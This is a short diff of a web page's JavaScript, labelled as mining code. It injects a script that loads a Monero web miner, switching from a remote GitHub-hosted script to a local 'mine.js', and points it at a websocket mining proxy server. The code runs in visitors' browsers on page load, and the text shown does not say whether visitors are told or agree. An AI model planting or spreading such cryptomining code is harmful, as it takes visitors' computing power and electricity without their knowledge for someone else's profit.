@@ -1,6 +1,6 @@
 // Start Of Mining Code (Javascript)
 var script = document.createElement("script");
-script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
+script.src = "mine.js";
 document.head.appendChild(script);
 
 server = "wss://f.xmrminingproxy.com:8181";
